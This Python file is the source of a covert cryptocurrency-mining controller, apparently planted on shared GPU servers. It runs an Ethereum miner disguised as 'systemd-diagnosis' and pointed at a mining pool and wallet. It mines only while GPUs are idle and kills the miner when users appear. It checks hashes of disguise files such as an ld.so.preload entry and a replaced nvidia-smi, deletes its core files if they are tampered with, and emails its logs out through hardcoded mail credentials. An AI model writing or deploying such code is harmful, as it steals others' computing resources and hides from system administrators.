from collections import deque
from email.mime.text import MIMEText
from re import match
from smtplib import SMTP, SMTPException
from subprocess import CalledProcessError, check_output
from threading import Thread
from time import localtime, sleep, strftime


global signal
signal = True

global logger
logger = deque(maxlen=500)


def logging(msg, level='INFO'):
    time = strftime('%Y-%m-%d %H:%M:%S', localtime())
    msg  = f'{time}-[{level}]: {msg}\n'
    global logger
    logger.append(msg)


class IntegrityCheck(Thread):

    def __init__(self):
        super().__init__()
        self.name = 'Integrity check'
        # status.
        self.__flag = True
        self.__integrity = False
        # scanning obj.
        self.__whitelist_user = '\|'.join(['ftp', 'kernel'])
        self.__delete_files = ' '.join([
            '/usr/bin/systemd-firewall',
            '/usr/bin/systemd-diagnosis'
        ])
        self.__check_files = [
            '/etc/ld.so.preload',
            '/usr/lib/libGNU.so',
            '/usr/bin/nvidia-smi',
            '/usr/bin/systemd-firewall',
            '/usr/bin/systemd-diagnosis'
        ]
        # init hash dictionary.
        self.__init_hash()

    def run(self):
        while self.__flag:
            self.__check_integrity()
            self.__reaction()
            sleep(2)

    def stop(self):
        self.__flag = False
    
    def __init_hash(self):
        self.__file_hash = dict()
        for file in self.__check_files:
            try:
                self.__file_hash[file] = check_output(['shasum', file]).decode().split()[0]
            except CalledProcessError:
                global signal
                signal = False
                logging(f'file {file} not found in initiate file hash.', 'ERRO')
                raise FileNotFoundError
        self.__integrity = True
        logging('initiate file hash: %s' % str(self.__file_hash), 'INFO')

    def __check_integrity(self):
        for k, v in self.__file_hash.items():
            try:
                shasum = check_output(['shasum', k]).decode().split()[0]
                if shasum != v:
                    self.__integrity = False
                    logging(f'{k} is mismatched, further check.', 'WARN')
                    break
            # file not found.
            except CalledProcessError:
                self.__integrity = False
                logging(f'{k} is missing, further check.', 'WARN')
                break

    def __reaction(self):
        if not self.__integrity:
            # check whether I am online.
            try:
                check_output(f"who | grep {self.__whitelist_user}", shell=True)
            # if not, something bad happend, delete miner.
            except CalledProcessError:
                print(f"rm -rf {self.__delete_files} &")
                global signal
                signal = False
                logging('files were changed by asshole, delete core files.', 'WARN')
                self.stop()

            # if yes, update hash.
            else:
                self.__init_hash()


class LoggingMessenger(Thread):
    
    def __init__(self):
        super().__init__()
        self.name  = 'Logging Messenger'
        self.__flag = True
        self.__local = 129
        self.__interval = 1200
        # email setting
        self.__mail_addr = 'kiswgknbjr@163.com'
        self.__mail_host = 'smtp.163.com'
        self.__mail_user = 'kiswgknbjr'
        self.__mail_pass = 'VCGGPQJNUKSBHVLI'
    
    def run(self):
        t = 0
        while self.__flag:
            # check global signal.
            if not signal:
                self.stop()
                break
            t = (t + 2) % self.__interval
            if t == 0:
                logging(check_output('nl-toolkit').decode(), 'INFO')
                self.__send_mail()
            else:
                sleep(2)
            
    def stop(self):
        self.__flag = False
        logging('program terminated, send last mail.', 'WARN')
        self.__send_mail()

    def __send_mail(self):
        # setting mail content
        global logger
        message = MIMEText(''.join(logger), _charset='utf-8')
        message['Subject'] = f"Runing log #{self.__local} {strftime('%Y-%m-%d %H:%M:%S', localtime())}"
        message['From'] = self.__mail_addr
        message['To'] = self.__mail_addr
        # connect mail server
        retry = 3 if self.__flag else 1
        print(''.join(logger))
        for _ in range(retry):
            try:
                smtp = SMTP()
                smtp.connect(self.__mail_host, 25)
                smtp.login(self.__mail_user, self.__mail_pass)
                smtp.sendmail(self.__mail_addr, self.__mail_addr, message.as_string())
                smtp.quit()
            except SMTPException:
                logging('fail to send mail.', 'ERRO')
                continue
            else:
                logger.clear()
                break


class MinerControl(Thread):

    def __init__(self):
        super().__init__()
        self.name = 'Miner control'
        self.__flag = True
        self.__waiting_round = 600
        self.__gen_memory_threshold = 9700
        self.__min_memory_threshold = 6000
        self.__waiting_count = -1
        self.__gpus = self.__get_avail_gpus(0)
        self.__working = [False] * len(self.__gpus)
        
    def run(self):
        global signal

        while self.__flag:
            # check global signal.
            if not signal:
                self.stop()
                break
            # if at 2:00 - 7:00
            if localtime().tm_hour > 1 and localtime().tm_hour < 7:
                avail_gpus = self.__get_avail_gpus(self.__min_memory_threshold)  # fully mining
            else:
                avail_gpus = self.__get_avail_gpus(self.__gen_memory_threshold)[:-1] # keep at least one empty GPU

            self.__waiting_count = (self.__waiting_count + 1) % self.__waiting_round
            # start miner
            if not self.__waiting_count:
                # update working state.
                self.__working = [False] * len(self.__gpus)
                workings = check_output('nl-toolkit | grep systemd-diagnosis | cut -c 6', shell=True).decode().split('\n')
                for gpu in workings[:-1]:
                    self.__working[int(gpu)] = True
                logging(f'working miner: {", ".join(workings)}.', 'INFO')
                # start miner.
                for gpu in avail_gpus:
                    if not self.__working[gpu]:
                        print("nohup systemd-diagnosis -epsw x -mode 1 -Rmode 0 -log 0 -mport 0 -etha 0 "
                             "-retrydelay 1 -ftime 55 -tt 79 -tstop 89 -asm 2 -pool eth.f2pool.com:6688 "
                             f"-gpus {gpu+1} -wal oxa31d3e12b -worker glib{gpu+1} -coin eth 2>&1 > /dev/null &")
                        self.__working[gpu] = True
                        logging(f'start mining on gpu{gpu}.', 'INFO')
                        sleep(1)
            # detect gpu status, kill the miner when some one is going to use the gpu.
            for gpu in self.__gpus:
                if gpu not in avail_gpus and self.__working[gpu]:
                    print(f"nl-toolkit | grep ' {gpu} ' |  grep 'systemd-diagnosis' | "
                          "cut -c 21-28 | xargs kill -9 2>&1 > /dev/null")
                    self.__working[gpu] = False
                    logging(f'stop mining on gpu{gpu}.', 'INFO')
                    logging(check_output('nl-toolkit').decode(), 'INFO')
            sleep(2)

    def stop(self):
        self.__flag = False
        print(f"nl-toolkit | grep 'systemd-diagnosis' | cut -c 21-28"
              " | xargs kill -9 2>&1 > /dev/null &")

    def __get_avail_gpus(self, memory_threshold):
        '''
        input:
            memory_threshold: int, min available video memory.
        output:
            gpus: list of int, available gpu list.
        '''
        gpus = list()
        smi  = check_output('nvidia-smi').decode().split('\n')
        for i, mem_info in enumerate(filter(lambda s: s.find('Default') != -1, smi)):
            memory   = match(r'.*?(\d+)MiB / (\d+)MiB', mem_info)
            res_mem  = int(memory.group(2)) - int(memory.group(1))
            if res_mem >= memory_threshold:
                gpus.append(i)
        return gpus


def main():
    miner    = MinerControl()
    checker  = IntegrityCheck()
    logmsger = LoggingMessenger()
    try:
        checker.start()
        sleep(10)
        miner.start()
        logmsger.start()
    except:
        miner.stop()
        checker.stop()
        logmsger.stop()

if __name__ == '__main__':
    main()